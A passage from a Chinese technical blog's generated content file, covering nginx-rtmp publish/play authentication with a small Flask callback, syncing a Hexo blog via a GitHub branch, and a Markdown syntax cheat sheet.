class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">rtmp </span>&#123;</span><br><span class="line">4<span class="class">server </span>&#123;</span><br><span class="line">44<span class="meta">#listen 1935;</span></span><br><span class="line">44listen <span class="number">10077</span>;</span><br><span class="line"></span><br><span class="line">44chunk_size <span class="number">4000</span>;</span><br><span class="line">44application <span class="class">live </span>&#123;</span><br><span class="line">444live on;</span><br><span class="line">444on_publish http:<span class="comment">//localhost:10078/user/auth;//后面的url即flask监听的地址</span></span><br><span class="line">444</span><br><span class="line">44&#125;</span><br><span class="line"></span><br><span class="line">4application <span class="class">hls </span>&#123;</span><br><span class="line">444live on;</span><br><span class="line">444hls on;</span><br><span class="line">444<span class="meta">#hls_path ../nginx-1.7.11.3-Gryphon/html/hls;</span></span><br><span class="line">444hls_path ../hls;</span><br><span class="line">444hls_fragment <span class="number">5</span>s;</span><br><span class="line">444on_publish http:<span class="comment">//localhost:10078/user/auth;</span></span><br><span class="line">44&#125;</span><br><span class="line">4&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python的flask后台代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#https://www.jianshu.com/p/0d14ae8f081c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#https://blog.csdn.net/wei389083222/article/details/78721074/</span></span><br><span class="line"><span class="comment">#https://blog.csdn.net/weixin_34368949/article/details/85991563</span></span><br><span class="line"><span class="comment">#验证只能用post方法</span></span><br><span class="line"><span class="comment">#虽然流密钥的格式像是get类型，但是必须使用POST获取参数。</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#传入url格式为: xx.xx.xx.xx:10078/user/auth?usr=xxx&amp;passWord=xxx</span></span><br><span class="line"><span class="meta">@app.route('/user/auth',methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">()</span>:</span></span><br><span class="line">    usr = request.form[<span class="string">'usr'</span>]<span class="comment">#从url后获取的数据</span></span><br><span class="line">    passWord = request.form[<span class="string">'passWord'</span>]</span><br><span class="line">    print(usr,<span class="string">'\t'</span>,passWord)</span><br><span class="line">    <span class="comment">#此处可改为从数据库获取数据</span></span><br><span class="line">    auth_user=<span class="string">'abc'</span></span><br><span class="line">    auth_passWord=<span class="string">'123'</span></span><br><span class="line">    <span class="keyword">if</span> auth_user == usr <span class="keyword">and</span> auth_passWord ==passWord:</span><br><span class="line">        <span class="keyword">return</span> Response(response=<span class="string">'success'</span>,status=<span class="number">200</span>)<span class="comment">#返回200状态码</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(status=<span class="number">500</span>)<span class="comment">#返回500状态码</span></span><br><span class="line">        <span class="comment">#Flask.abort(404)</span></span><br><span class="line">    <span class="keyword">return</span> passWord</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">10078</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>播放权限也可用类似on_publish的验证方法进行控制。</p><p>on_play和on_publish 一样，只接受post方法，若需要接受get方法需要在rtmp中application的配置中添加<pre>notify_method get;</pre>，然后可在http{}部分中处理调用（这部分语法我不太清楚，不详细展开）。</p><p>以下是nginx.conf关于on_play的用法</p><p>on_play<br>语法：on_play url<br>上下文：rtmp, server, application<br>描述：设置 HTTP 播放回调。每次一个客户分发播放命令时，一个 HTTP 请求异步发送，命令处理会挂起 - 直到它返回结果码。之后再解析 HTTP 结果码。</p><ul><li><p>HTTP 2XX 返回码的话继续 RTMP 会话。</p></li><li><p>HTTP 3XX 返回码的话 重定向 RTMP 到另一个流，这个流的名字在 HTTP 返回头的 Location 获取。如果新流的名字起始于 rtmp:// 然后远程 relay 会被创建。relay 要求 IP 地址是指定的而不是域名，并且只工作在 1.3.10 版本以上的 nginx。另请参考 notify_relay_redirect。</p></li><li><p>其他返回码的话 RTMP 连接丢弃。<br>重定向例子：</p></li></ul>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="section">http</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="attribute">location</span> /local_redirect &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^.*$</span> newname? <span class="literal">permanent</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /remote_redirect &#123;</span><br><span class="line">        <span class="comment"># no domain name here, only ip</span></span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^.*$</span> rtmp://192.168.1.123/someapp/somename? <span class="literal">permanent</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="section">rtmp</span> &#123;</span><br><span class="line">    <span class="attribute">application</span> myapp1 &#123;</span><br><span class="line">        <span class="attribute">live</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="comment"># stream will be redirected to 'newname'</span></span><br><span class="line">        <span class="attribute">on_play</span> http://localhost:8080/local_redirect;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">application</span> myapp2 &#123;</span><br><span class="line">        <span class="attribute">live</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="comment"># stream will be pulled from remote location</span></span><br><span class="line">        <span class="comment"># requires nginx &gt;= 1.3.10</span></span><br><span class="line">        <span class="attribute">on_play</span> http://localhost:8080/remote_redirect;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HTTP 请求接收到一些个参数。在 application/x-www-form-urlencoded MIME 类型下使用 POST 方法。以下参数会被传送给调用者：</p><ul><li>call=play。</li><li>addr - 客户端 IP 地址。</li><li>app - application 名。</li><li>flashVer - 客户端 flash 版本。</li><li>swfUrl - 客户端 swf url。</li><li>tcUrl - tcUrl。</li><li>pageUrl - 客户端页面 url。</li><li>name - 流名。<br>出了上述参数之外其他所有播放命令参数显式地发送回调。例如如果一个流由 url rtmp://localhost/app/movie?a=100&amp;b=face&amp;foo=bar 访问，然后呢 a,b 和 foo 发送回调。<br>on_play <a href="http://example.com/my_callback" target="_blank" rel="noopener">http://example.com/my_callback</a>;</li></ul><h2 id="过程中使用到的额外软件"><a href="#过程中使用到的额外软件" class="headerlink" title="过程中使用到的额外软件"></a>过程中使用到的额外软件</h2><ul><li>obs</li><li>手机端:快直播</li><li>ffmpeg推流（没用过）</li></ul>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> rtmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+gitPages Synchronization</title>
      <link href="/2019/05/16/hexo-gitPages-Synchronization/"/>
      <url>/2019/05/16/hexo-gitPages-Synchronization/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-gitPages-的博客多端同步管理及迁移"><a href="#Hexo-gitPages-的博客多端同步管理及迁移" class="headerlink" title="Hexo+gitPages 的博客多端同步管理及迁移"></a>Hexo+gitPages 的博客多端同步管理及迁移</h1><blockquote><p>本文参考</p><p><a href="https://blog.csdn.net/Monkey_LZL/article/details/60870891" target="_blank" rel="noopener">如何解决github+Hexo的博客多终端同步问题</a></p><p><a href="https://www.jianshu.com/p/0b1fccce74e0" target="_blank" rel="noopener">利用Hexo在多台电脑上提交和更新github pages博客</a></p><p><a href="https://righere.github.io/2016/10/10/install-hexo/" target="_blank" rel="noopener">搭建hexo博客并简单的实现多终端同步</a></p><p><a href="https://www.jianshu.com/p/fceaf373d797" target="_blank" rel="noopener">hexo博客同步管理及迁移</a></p></blockquote><p>主体的思路是将博文内容相关文件放在Github项目中master中，将Hexo配置写博客用的相关文件(包括博客内容主题等等)放在Github项目的hexo分支上，这个是关键，多终端的同步只需要对分支hexo进行操作。</p><h3 id="同步的首次操作"><a href="#同步的首次操作" class="headerlink" title="同步的首次操作"></a>同步的首次操作</h3><p>在创建了博客的目录下操作，push本地文件夹Hexo中的必要文件到yourname.github.io的hexo分支上。</p><p>只托管部分用于多终端的同步的文件</p><p><strong>注意</strong>：使用第三方主题时，要删除第三方主题的.git文件夹删除，不然无法push到远程仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git init  //初始化本地仓库</span><br><span class="line">git add source //将必要的文件依次添加，有些文件夹如npm install产生的node_modules由于路径过长不好处理，所以这里没有用`git add .`命令了，而是依次添加必要文件，如下图所示,其实也可以用'git add .'命令，在.gitignore文件中加入不需要同步的文件即可</span><br><span class="line">git commit -m "Blog Source Hexo"</span><br><span class="line">git branch hexo  //新建hexo分支</span><br><span class="line">git checkout hexo  //切换到hexo分支上</span><br><span class="line">git remote add origin git@github.com:yourname/yourname.github.io.git  //将本地与Github项目对接</span><br><span class="line">git push origin hexo  //push到Github项目的hexo分支上</span><br></pre></td></tr></table></figure><p>多出来的hexo的分支，用于文件同步，原有的master分支用于部署静态博客页面</p><h3 id="在新终端进行更新博客"><a href="#在新终端进行更新博客" class="headerlink" title="在新终端进行更新博客"></a>在新终端进行更新博客</h3><p>先从github中把文件clone到本地，然后安装相应组件。然后通过git的提交同步内容，用hexo的命令部署博客到gitPages里。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone -b hexo git@github.com:yourname/yourname.github.io.git  //将Github中hexo分支clone到本地</span><br><span class="line">cd  yourname.github.io  //切换到刚刚clone的文件夹内</span><br><span class="line">npm install    //注意，这里一定要切换到刚刚clone的文件夹内执行，安装必要的所需组件，不用再init</span><br><span class="line">hexo new post "new blog name"   //新建一个.md文件，并编辑完成自己的博客内容</span><br><span class="line">git add source  //经测试每次只要更新sorcerer中的文件到Github中即可，因为只是新建了一篇新博客，如果更改了主题样式的话还是建议用'git add .'</span><br><span class="line">git commit -m "XX"</span><br><span class="line">git push origin hexo  //更新分支</span><br><span class="line">hexo d -g   //push更新完分支之后将自己写的博客对接到自己搭的博客网站上，同时同步了Github中的master</span><br></pre></td></tr></table></figure><h3 id="已有博客的终端更新博客"><a href="#已有博客的终端更新博客" class="headerlink" title="已有博客的终端更新博客"></a>已有博客的终端更新博客</h3><p>进入相应的文件夹，更新博客直行命令即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git pull origin hexo//先pull完成本地和远端的融合</span><br><span class="line">hexo new post <span class="string">"new blog"</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"Blog update"</span></span><br><span class="line">git push origin hexo</span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown Syntax</title>
      <link href="/2019/05/14/Markdown-Syntax/"/>
      <url>/2019/05/14/Markdown-Syntax/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown-Syntax"><a href="#Markdown-Syntax" class="headerlink" title="Markdown Syntax"></a><center>Markdown Syntax</center></h1><blockquote><p>本文参考</p><p><a href="https://www.jianshu.com/p/191d1e21f7ed" target="_blank" rel="noopener">Markdown基本语法(简书)</a></p><p><a href="www.markdown.cn">Markdown官方文档</a></p><p><a href="https://www.jianshu.com/p/b03a8d7b1719#fnref1" target="_blank" rel="noopener">Markdown语法html支持</a></p><p><a href="http://www.pianshen.com/article/2061138675/#_51" target="_blank" rel="noopener">Markdown部分详细用法</a></p></blockquote><hr><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>Markdown 支持两种标题的语法，类 Setext 和类 atx 形式。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Atx形式</span><br><span class="line"></span><br><span class="line"><span class="section"># 这是一级标题</span></span><br><span class="line"><span class="section">## 这是二级标题</span></span><br><span class="line"><span class="section">### 这是三级标题</span></span><br><span class="line"><span class="section">#### 这是四级标题</span></span><br><span class="line"><span class="section">##### 这是五级标题</span></span><br><span class="line"><span class="section">###### 这是六级标题</span></span><br></pre></td></tr></table></figure><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Setext形式</span><br><span class="line"></span><br><span class="line">This is an H1</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">This is an H2</span><br><span class="line">-------------</span><br></pre></td></tr></table></figure><h1 id="This-is-an-H1"><a href="#This-is-an-H1" class="headerlink" title="This is an H1"></a>This is an H1</h1><h2 id="This-is-an-H2"><a href="#This-is-an-H2" class="headerlink" title="This is an H2"></a>This is an H2</h2><h2 id="根据标题生成目录"><a href="#根据标题生成目录" class="headerlink" title="根据标题生成目录"></a>根据标题生成目录</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TOC]  根据标题自动生成目录</span><br></pre></td></tr></table></figure><p>[TOC]</p><hr><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="strong">*这是加粗的文字*</span><span class="strong">*</span></span><br><span class="line"><span class="strong">*</span>这是倾斜的文字<span class="strong">*`</span></span><br><span class="line"><span class="strong">*</span>*<span class="strong">*这是斜体加粗的文字*</span>*<span class="strong">*</span></span><br><span class="line"><span class="strong">~~这是加删除线的文字~~</span></span><br></pre></td></tr></table></figure><p><strong>加粗测试</strong></p><p><em>倾斜测试</em></p><p><strong><em>斜体加粗测试</em></strong></p><p><del>删除线测试</del></p><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line"><span class="meta">&gt;&gt;</span>这是引用的内容</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;多重引用</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><blockquote><p>引用测试一</p><blockquote><p>引用测试二</p><blockquote><p>多重引用</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>引用测试</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><hr><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span></span><br><span class="line"><span class="string">***</span></span><br><span class="line"><span class="string">*****</span></span><br></pre></td></tr></table></figure><p>只要三个以上就可以</p><hr><hr><hr><hr><hr><h2 id="图片引用"><a href="#图片引用" class="headerlink" title="图片引用"></a>图片引用</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">图片alt</span>](<span class="link">图片地址 ''图片title''</span>)</span><br><span class="line"></span><br><span class="line">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class="line">图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/</span><br><span class="line">u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg "区块链")</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg&quot;区块链&quot;" alt="blockchain"></p><h3 id="插入带有链接的图片"><a href="#插入带有链接的图片" class="headerlink" title="插入带有链接的图片"></a>插入带有链接的图片</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">[图片上传失败...(image-f83b77-1542510791300)</span>]](http://www.baidu.com)&#123;:target="_blank"&#125;       // 内链式</span><br><span class="line"></span><br><span class="line">[<span class="string">[图片上传失败...(image-4dc956-1542510791300)</span>]][5]&#123;:target="_blank"&#125;                      // 引用式</span><br><span class="line">[<span class="symbol">5</span>]: <span class="link">http://www.baidu.com</span></span><br></pre></td></tr></table></figure><p><a href="htttp://www.baidu.com" target="_blank" rel="noopener">[图片上传失败…(image-f83b77-1542510791300)]</a>{:target=”_blank”}</p><p>内链式</p><p><a href="http://www.baidu.com/" target="_blank" rel="noopener">[图片上传失败…(image-f83b77-1542510791300)]</a>{:target=”blank”}</p><p>外链式</p><hr><h2 id="超链接引用"><a href="#超链接引用" class="headerlink" title="超链接引用"></a>超链接引用</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">超链接名</span>](<span class="link">超链接地址 "超链接title"</span>)</span><br><span class="line">title可加可不加</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">简书</span>](<span class="link">http://jianshu.com</span>)</span><br><span class="line">[<span class="string">百度</span>](<span class="link">http://baidu.com</span>)</span><br></pre></td></tr></table></figure><p><a href="http://baidu.com" target="_blank" rel="noopener">baidu</a></p><p>注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"超链接地址"</span> <span class="attribute">target</span>=<span class="string">"_blank"</span>&gt;超链接名&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"https://www.jianshu.com/u/1f5ac0cf6a8b"</span> <span class="attribute">target</span>=<span class="string">"_blank"</span>&gt;简书&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/u/1f5ac0cf6a8b" target="_blank">简书</a></p><hr><h2 id="视频插入"><a href="#视频插入" class="headerlink" title="视频插入"></a>视频插入</h2><p>注：Markdown 语法是不支持直接插入视频的<br> 普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法<br> 第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面</p><p><strong>代码1</strong><br> 注：多数第三方平台不支持插入<code>&lt;iframe&gt;</code>视频</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">height</span>=<span class="string">498</span> <span class="attr">width</span>=<span class="string">510</span> <span class="attr">src</span>=<span class="string">'http://player.youku.com/embed/XMjgzNzM0NTYxNg=='</span> <span class="attr">frameborder</span>=<span class="string">0</span> '<span class="attr">allowfullscreen</span>'&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>代码2</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">[图片上传失败...(image-49aefe-1542510791300)</span>]](http://v.youku.com/v<span class="emphasis">_show/id_</span>XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&amp;from=y1.3-tv-grid-1007-9910.86804.1-2#paction)&#123;:target="_blank"&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">无序列表用任一种皆可</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>列表内容</span><br><span class="line"><span class="bullet">+ </span>列表内容</span><br><span class="line"><span class="bullet">* </span>列表内容</span><br><span class="line"></span><br><span class="line">注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><ul><li>列表（-）</li><li>列表（-）</li></ul><ul><li>列表（+）</li></ul><ul><li>列表（*）</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">有序列表内容</span><br><span class="line"></span><br><span class="line">1.列表内容</span><br><span class="line">2.列表内容</span><br><span class="line">3.列表内容</span><br><span class="line"></span><br><span class="line">注意：序号跟内容之间要有空格</span><br></pre></td></tr></table></figure><ol><li>第一点</li><li>第二点</li><li>第三点</li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**上一级和下一级之间敲三个空格即可**</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>一级无序列表内容</span><br><span class="line">  - 二级无序列表内容</span><br><span class="line">  - 二级无序列表内容</span><br><span class="line">  - 二级无序列表内容</span><br><span class="line"><span class="bullet">- </span>一级无序列表内容</span><br><span class="line">  1. 二级有序列表内容</span><br><span class="line">  2. 二级有序列表内容</span><br><span class="line">  3. 二级有序列表内容</span><br><span class="line"></span><br><span class="line"><span class="bullet">1. </span>一级有序列表内容</span><br><span class="line">   - 二级无序列表内容</span><br><span class="line">   - 二级无序列表内容</span><br><span class="line">   - 二级无序列表内容</span><br><span class="line"><span class="bullet">2. </span>一级有序列表内容</span><br><span class="line">   1. 二级有序列表内容</span><br><span class="line">   2. 二级有序列表内容</span><br><span class="line">   3. 二级有序列表内容</span><br></pre></td></tr></table></figure><p><strong>上一级和下一级之间敲三个空格即可</strong></p><ul><li>一级无序列表内容<ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li>一级无序列表内容<ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ul><ol><li>一级有序列表内容<ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li>一级有序列表内容<ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ol><hr><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">表头|<span class="string">表头</span>|<span class="string">表头</span></span><br><span class="line"><span class="string">---</span>|<span class="string">:--:</span>|<span class="string">---:</span></span><br><span class="line"><span class="string">内容</span>|<span class="string">内容</span>|<span class="string">内容</span></span><br><span class="line"><span class="string">内容</span>|<span class="string">内容</span>|<span class="string">内容</span></span><br><span class="line"></span><br><span class="line"><span class="string">第二行分割表头和内容。</span></span><br><span class="line"><span class="string">- 有一个就行，为了对齐，多加了几个</span></span><br><span class="line"><span class="string">文字默认居左</span></span><br><span class="line"><span class="string">-两边加：表示文字居中</span></span><br><span class="line"><span class="string">-右边加：表示文字居右</span></span><br><span class="line"><span class="string">注：原生的语法两边都要用 </span>|<span class="string"> 包起来。此处省略</span></span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名|技能|排行</span><br><span class="line">--|:--:|--:</span><br><span class="line">刘备|哭|大哥</span><br><span class="line">关羽|打|二哥</span><br><span class="line">张飞|骂|三弟</span><br></pre></td></tr></table></figure><table><thead><tr><th>姓名</th><th style="text-align:center">技能</th><th style="text-align:right">排行</th></tr></thead><tbody><tr><td>刘备</td><td style="text-align:center">哭</td><td style="text-align:right">大哥</td></tr><tr><td>关羽</td><td style="text-align:center">打</td><td style="text-align:right">二哥</td></tr><tr><td>张飞</td><td style="text-align:center">骂</td><td style="text-align:right">三弟</td></tr></tbody></table><p>Typora编辑器中可以直接使用crtl+T，或者在菜单段落中找到表格生成</p><hr><h2 id="代码引用"><a href="#代码引用" class="headerlink" title="代码引用"></a>代码引用</h2><p>单行代码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">`代码内容`</span></span><br></pre></td></tr></table></figure><p><code>int main(){return 0;}</code></p><p>代码块</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="code">```)language</span></span><br><span class="line"><span class="code">  代码...</span></span><br><span class="line"><span class="code">  代码...</span></span><br><span class="line"><span class="code">  代码...</span></span><br><span class="line"><span 